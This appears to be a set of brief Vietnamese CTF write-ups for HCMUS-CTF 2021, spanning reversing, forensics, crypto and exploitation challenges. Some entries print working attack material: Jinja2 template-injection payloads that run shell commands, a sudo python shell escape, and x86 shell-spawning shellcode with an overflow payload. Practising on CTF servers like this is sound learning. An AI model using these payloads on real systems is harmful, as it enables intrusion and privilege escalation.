# Sanity Check
Base 32 => Base 64 => Caesar

# Faded
PyInstaller extractor + Decompyle3

# mixed_vm
Một bài virtual machine obfuscation. Ngồi dò opcodes, ta thấy mỗi một đoạn kí tự thực hiện 2 bước xor và plus và so sánh với các dãy số có sẵn.

# AndroidRev
Flag gồm 5 từ, mỗi từ được hash thành mã md5, sau đó lên mạng mình dò hash md5 trên database và từ từ nối lại thành flag

# EscapeMe
`sudo -l` cho ta biết ta có thể xài python3, sau đó `sudo python -c 'import os; os.system("/bin/sh")'` và `cat flag.txt`

# WeirdProtocol
File PE sẽ tạo ra một file PE khác và kết nối vào để kiểm tra input, một hồi xem xét thì ta biết rằng file PE dùng mã SHA256 để kiểm tra input, lên mạng dò ta ra được chuỗi `hello`

# CrackMe
SHA512-Crypt + rsa, xài hashcat

# Maquerade
một file mp3, một file java class và 1 file zip. file mp3 ra mật khẩu `pwd785$`, còn cái java class crack sẽ cho ra `897268$}`, và ta có được flag

# SaveMe
Đảo từng cặp byte kề nhau, sau đó `xxd -r` cho ra file hình kèm flag

# Nothingless
url: http://61.28.237.24:30103/
```
Sorry / is under construction. Please try again later
```
Đây là một vấn đề server side template injection
Ta kiểm tra thử xem thế nào
url: http://61.28.237.24:30103/{{1+1}}
```
Sorry /2 is under construction. Please try again later
```
Có thể là jinja2 chăng?<br/>
{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls").read()}}
```
Sorry /__pycache__ app.py requirements.txt is under construction. Please try again later
```
Cuối cùng <br/>
{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat ../flag_HKOOS2lrdD").read()}}
```
Sorry /HCMUS-CTF{404_teMpl4t3_1njEctIon} is under construction. Please try again later
```
flag: HCMUS-CTF{404_teMpl4t3_1njEctIon}

# Dodge
ssh ctf@61.28.237.24 -p30400<br/>
password: hcmus-ctf
Ban đầu ta test thử thì thấy ta có thể sử dụng lệnh ls và lệnh echo.<br/>
Ta có thể sử dụng lệnh shell thay cho cat
```shell
  while read line; do
    echo $line;
  done <flag.txt
```
flag: HCMUS-CTF{You_know_some_command_line_stuff}<br/>
Tham khảo: https://jarv.org/posts/cat-without-cat/

# StrangerThing
ssh ctf@61.28.237.24 -p30401<br/>
password: hcmus-ctf
```shell
cat flag1.txt 		                #=> HCMUS-CTF{this 
cat -- '-flag 2.txt' 		          #=> _is_used_to_test
ls ./secret/ -a                   #=> .flag3.txt
cat ./secret/.flag3.txt	          #=> _linux_command_line}
```
=> HCMUS-CTF{this_is_used_to_test_linux_command_line}

# Metadata
Lấy image từ dockerhub ở vinhph2/hcmus-ctf-2021<br/>
Inspect xem thử như thế nào 
![image](https://user-images.githubusercontent.com/20945393/119263609-f40aad00-bc09-11eb-83f7-b4678439360a.png)
flag: HCMUS-CTF{d0ck6r_1mag6_1nsp6ct}<br/>
fake flag: HCMUS{docker_image}

# Challenge: mybirthday
ghi đè `[ebp-0xc]` = `0xcabbfeff`

# Challenge: bank1
bof

# Challenge: bank2
ghi đè return address bằng địa chỉ của hàm `getFlag()`

# Challenge: bank3
y như bài bank2 luôn :v

# Challenge: bank4
sử dụng các gadget ghi "/bin/sh" vào data segment rồi gọi `int_80`. Bài này thì cái gadget `pop_eax ; ret` có chứa byte `\x0a` tức là EOF, mà hàm `gets()` sẽ terminate khi gặp EOF, nên mình sẽ lấy gadget khác là `0x08056794 : pop eax ; pop edx ; pop ebx ; ret`.

# Challenge: bank5
y như bài bank4, nhưng lần này thì các gadget mình cần thì không có gadget nào chứa bad chars.

# Challenge: bank6
Bài này mình nhập shellcode vào biến name rồi return về biến name để chạy shellcode. Địa chỉ biến name thì đã được đề cho. Nhưng cái khó là lúc ghi đè return address là địa chỉ biến name thì nó lại không return về mà lại return về 1 địa chỉ khác. Mình cũng stuck ở đây khá lâu. Sau 1 hồi 1 debug thì mình để ý là sau 2 lần thực hiện lệnh leave thì ebp sẽ chứa giá trị rác mà ta nhập, và 4 bytes sau địa chỉ chứa giá trị rác đó là địa chỉ chứa địa chỉ return address. Và mình cũng thấy là offset giữa ebp và địa chỉ chứa return address có vẻ là cố định giữa các con số (0x24, 0x34, 0x44, 0x54, ...) nên mình pick random là 0x24 rồi ngồi chờ đợi script chạy thôi :)) . Một lưu ý là các shellcode mình thấy trên mạng thường sẽ chứa bytes `\x0b`, là bad char của hàm `scanf()` nên mình sẽ modify shellcode lại chút. Đây là shellcode mình dùng:
`"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x08\x40\x40\x40\xcd\x80\x31\xc0\x40\xcd\x80"`
Còn đây là payload của mình:
````python
payload = shellcode
payload += b'a'*(1000-len(payload))
payload += p32(leak)
payload += b'b'*(1036-len(payload))
````

# Challenge: SingleByte
xor

# Challenge: TestYourCmd
fix file `Master.png`, tìm email Messi gửi cho Ronaldo, decode base64 content được passphrase, có được passphrase rồi vào steghide mấy cái image trong directory Secret.

# Challenge: Memory
volatility consoles ==> first part of the encryption key, memdump notepad.exe ==> second part, trong các cmd thì mình thấy có cmd `You should get the flag online`, mình mới thử grep trong file `memory.raw` xem có link nào thú vị không, kết quả là tìm được `https://drive.google.com/file/d/1BBtY2q5h89Wkml6DLwlUSMJUUls3khtE/view`, tới đây rồi download file về, dùng encryption key để unzip.

# The Chosen One
Bài này xem file .py thì nhận ra là dạng AES-ECB mà nhược điểm của loại AES này là nếu thông tin các block giống nhau thì nó sẽ mã hóa ra giống nhau.
Nên mình quyết định dùng chosen plaintext attack.

Bước đầu tìm padding_char (tạm gọi là x):

Nếu gửi "a" tới sever thì ta có block 1 là `"a" + flag[0:31]` và block 2 là `"}" + x * 31`.
Vậy gửi sever `"}" x * 31 + "a"` thì ta được 3 block với block 1 y như block 3.Bruteforce kí tự là ra được x.


Bước 2 là tìm từng kí tự của flag với cách làm tương tự bước 1 sau khi tìm ra được x thì tiếp tục gửi tới sever `y + "}" + x * 30 + "aa"` thì block 3 sẽ là `flag[31] + "}" + x * 30`. Bruteforce từng kí tự là ra được flag[31] rồi tương tự tìm hết các kí tự còn lại.

Source code [here](https://github.com/Iam4rtsit/Hcmus/blob/main/attack.py)

